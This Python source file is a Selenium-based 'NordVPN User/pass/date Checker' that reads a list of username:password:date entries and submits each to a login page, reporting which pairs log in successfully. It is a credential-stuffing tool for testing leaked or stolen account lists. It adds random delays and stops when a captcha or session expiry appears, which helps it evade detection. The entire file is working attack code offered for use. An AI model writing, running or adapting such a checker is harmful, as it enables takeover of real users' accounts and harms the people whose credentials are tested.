from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException 
from selenium.webdriver.common.keys import Keys
from datetime import datetime
from random import randrange
from colorama import Fore, Back, Style
import time
import sys
import os
import win32api, win32con

def click(x,y):
    time.sleep(5)
    win32api.SetCursorPos((x,y))
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,x,y,0,0)
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,x,y,0,0)


def rando():
    return (randrange(15))


def check_exists_by_xpath(xpath):
    try:
        driver.find_element_by_xpath(xpath)
    except NoSuchElementException:
        return False
    return True

textart="""


░█▀▀█ █▀▀█ █▀▀ █▀▀█ █▀▄▀█ █──█ ░█▀▀█ █──█ ─▀─ █▀▀ █─█ █▀▀ █▀▀▄ ░█▀▀▀█ █▀▀█ █──█ █▀▀█ 
░█─── █▄▄▀ █▀▀ █▄▄█ █─▀─█ █▄▄█ ░█─── █▀▀█ ▀█▀ █── █▀▄ █▀▀ █──█ ─▀▀▀▄▄ █──█ █──█ █──█ 
░█▄▄█ ▀─▀▀ ▀▀▀ ▀──▀ ▀───▀ ▄▄▄█ ░█▄▄█ ▀──▀ ▀▀▀ ▀▀▀ ▀─▀ ▀▀▀ ▀──▀ ░█▄▄▄█ ▀▀▀▀ ─▀▀▀ █▀▀▀
                                                                                                    
NORDVPN User/pass/date Checker
Developer: @creamychickens1
InputFile: user:pass:date > username:passwd:2021-07-27
"""

print(textart)


url=input("Enter url:")
flocation=input("Enter InputFile:")

currentdate=datetime.today().strftime('%Y-%m-%d')


try:
    driver = webdriver.Firefox(executable_path='./geckodriver')
    driver.set_window_size(800, 600)
    
    driver.get(url)
    fp1=open(flocation, 'r')
    for line in fp1 :
        ll=line.split(':')
        time.sleep(rando())
        if(ll[2]>=currentdate):
            xpath_data = '/html/body/div[1]/div/div/div/div/div/div/h1'
            if(check_exists_by_xpath(xpath_data)):
                data = driver.find_element_by_xpath(xpath_data)
                if(data.text == "Your session has expired"):
                    print(Fore.RED +"Please close and get new url")
                    os._exit(1)
        
        
            xpath_email='//*[@id="identifier_field"]'
            if(check_exists_by_xpath(xpath_email)):
                emailInput = driver.find_element_by_xpath(xpath_email)
                emailInput.send_keys(ll[0])
                time.sleep(0.2)
                contiloc='/html/body/div[1]/div/div/div/div/div/div/form/fieldset/button'
                conti = driver.find_element_by_xpath(contiloc)
                conti.click()
                time.sleep(0.2)

            xpath_pass='//*[@id="password_field"]'
            if(check_exists_by_xpath(xpath_pass)):
                passInput = driver.find_element_by_xpath(xpath_pass)
                passInput.send_keys(ll[1])
                time.sleep(0.2)
                logloc='/html/body/div[1]/div/div/div/div/div/div/form/fieldset/button[1]'
                login = driver.find_element_by_xpath(logloc)
                login.click()
                time.sleep(0.2)
                
            time.sleep(3)   
            capchapath='/html/body/div[1]/div/div/div/div/div/div/div/h1'
            if(check_exists_by_xpath(capchapath)):
                data = driver.find_element_by_xpath(capchapath)
                if(data.text == "One more step"):
                    print(Fore.RED +'Something is wrong!!!!!')
                    fp1.close()
                    driver.close()
                    #sys.exit(0)
                    os._exit(1)
                
            click(570,210)
            xpath_data = '/html/body/div[1]/div/div/div/div/div/div/div[1]/div/p/span'
            if(check_exists_by_xpath(xpath_data)):
                data = driver.find_element_by_xpath(xpath_data)
                if(data.text == "Incorrect password"):
                    print(Fore.RED +'[-] '+ll[0]+' '+ll[1]+' incorrect')
                    driver.back()
                    time.sleep(0.2)
                    driver.back()
                elif(data.text == "Account locked for your security. We’ve sent you an email to unlock it. Alternatively, reset your password or use another login method."):
                    print(Fore.RED +'[-] '+ll[0]+' '+ll[1]+' incorrect')
                    driver.back()
                    time.sleep(0.2)
                    driver.back()
            xpath_data = '/html/body/div[1]/div/div/div/div/div/div/h1'
            if(check_exists_by_xpath(xpath_data)):
                data = driver.find_element_by_xpath(xpath_data)
                if(data.text == "Logged in successfully" or data.text == "Something went wrong"):
                    print(Back.GREEN+'[+] '+ll[0]+' '+ll[1]+' correct')
                    os._exit(1)        
        else:
            print(Fore.RED +'[-] '+ll[0]+' '+ll[1]+' '+ll[2]+' Expired')
    fp1.close()
    driver.close
except:
    print(Fore.RED +'Something is wrong!!!!!')
    fp1.close()
    driver.close()
    os._exit(1)